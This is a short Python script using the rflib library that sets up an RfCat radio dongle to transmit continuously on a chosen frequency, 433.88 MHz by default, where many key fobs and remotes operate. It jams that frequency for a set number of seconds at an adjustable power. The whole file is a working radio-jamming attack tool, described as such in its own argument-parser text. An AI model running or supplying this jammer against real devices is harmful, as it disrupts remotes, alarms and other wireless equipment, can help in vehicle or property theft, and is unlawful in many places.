#!/usr/bin/env python

import sys
import datetime as dt
from rflib import *
from struct import *
import bitstring
import operator
import time
import argparse

keyLen = 0
baudRate = 4800
frequency = 433880000
repeatNum = 25

def ConfigureD(d):
	d.setMdmModulation(MOD_ASK_OOK)
	d.setFreq(frequency)
	d.makePktFLEN(0)
	d.setMdmDRate(4800)

def jamFreq(d,freq):
 d.setModeTX()

def stopJam(d):
 d.setModeIDLE()

 
 
parser = argparse.ArgumentParser(description='Application to use a RFCat compatible device to Jam a particular frequency',version="0.1-bricktop")
parser.add_argument('-f', action="store", default="433880000", dest="baseFreq",help='Target frequency to listen for remote (default 433880000)',type=int)
parser.add_argument('-r', action="store", dest="baudRate",default=4800,help='Baudrate, defaults to 4800',type=int)
parser.add_argument('-t', action="store", dest="jamTime",default=15,help='Seconds to jam for, defaults to 15 seconds',type=int)
parser.add_argument('-p', action="store", default="100", dest="power",help='Power level for re-transmitting',type=int)
results = parser.parse_args()

print "Configuring RfCat"
d = RfCat()
d.setMdmModulation(MOD_ASK_OOK)
d.setFreq(results.baseFreq)
d.setMdmSyncMode(0)
d.setMdmDRate(results.baudRate)
d.setMdmChanSpc(24000)
d.setModeIDLE()
d.setPower(results.power)



abort_after = results.jamTime
start = time.time()
print "Starting Jam on " + str(results.baseFreq)
try:
	jamFreq(d,results.baseFreq)
except ChipconUsbTimeoutException:
	pass

while True:
  delta = time.time() - start
  if delta >= abort_after:
    break

print "Completed Jam"
d.setModeIDLE()
